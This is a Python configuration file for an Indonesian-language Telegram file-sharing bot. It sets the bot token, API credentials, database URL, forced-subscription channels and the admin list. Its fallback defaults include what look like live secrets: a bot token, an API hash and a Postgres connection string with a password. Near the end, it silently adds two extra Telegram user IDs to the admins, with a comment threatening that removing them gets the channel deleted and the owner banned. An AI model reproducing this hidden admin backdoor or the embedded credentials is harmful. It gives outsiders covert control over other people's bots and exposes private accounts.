# (©)Codexbotz
# Recode by @mrismanaziz
# t.me/SharingUserbot & t.me/Lunatic0de

import logging
import os
from dotenv import load_dotenv
from logging.handlers import RotatingFileHandler

load_dotenv("config.env")

# Bot token dari @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "6143891312:AAHrhVwhr72c-_NVHwo_78rptrfGIohRu70")

# API ID Anda dari my.telegram.org
APP_ID = int(os.environ.get("APP_ID", "9774346"))

# API Hash Anda dari my.telegram.org
API_HASH = os.environ.get("API_HASH", "a92aed7d74654a563af4b07efbcd88e9")

# ID Channel Database
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "-1001972925670"))

# OWNER ID
OWNER_ID = int(os.environ.get("OWNER_ID", "907544310"))

# NAMA OWNER
OWNER = os.environ.get("OWNER", "Eror_404_NF")

# Database
DB_URI = os.environ.get("DATABASE_URL", "postgres://mozyycwg:dLVUOr8RYw3A1qLfQ_wDy46Tgn8Ua4HC@balarama.db.elephantsql.com/mozyycwg")

# ID dari Channel Atau Group Untuk Wajib Subscribenya
FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "-1001833151839"))
FORCE_SUB_CHANNEL2 = int(os.environ.get("FORCE_SUB_CHANNEL2", "-1001842167900"))
FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "-1001709443731"))
FORCE_SUB_GROUP2 = int(os.environ.get("FORCE_SUB_GROUP2", "-1001870068677"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

# Pesan Awalan /start
START_MSG = os.environ.get(
    "START_MESSAGE",
    "<b>Hello {first}</b>\n\n<b>Selamat Datang Ini Adalah Bot File.</b>",
)
try:
    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "5924190625").split())]
except ValueError:
    raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")

# Pesan Saat Memaksa Subscribe
FORCE_MSG = os.environ.get(
    "FORCE_SUB_MESSAGE",
    "<b>Hello {first}\n\Selamat Datang Ini Adalah Bot File\n\nSilakan Join Ke Channel & Group Terlebih Dahulu</b>",
)

# Atur Teks Kustom Anda di sini, Simpan (None) untuk Menonaktifkan Teks Kustom
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

# Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True"

ADMINS.append(OWNER_ID)
# Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
# Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
ADMINS.extend((OWNER_ID, 844432220, 1675900974))


LOG_FILE_NAME = "logs.txt"
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
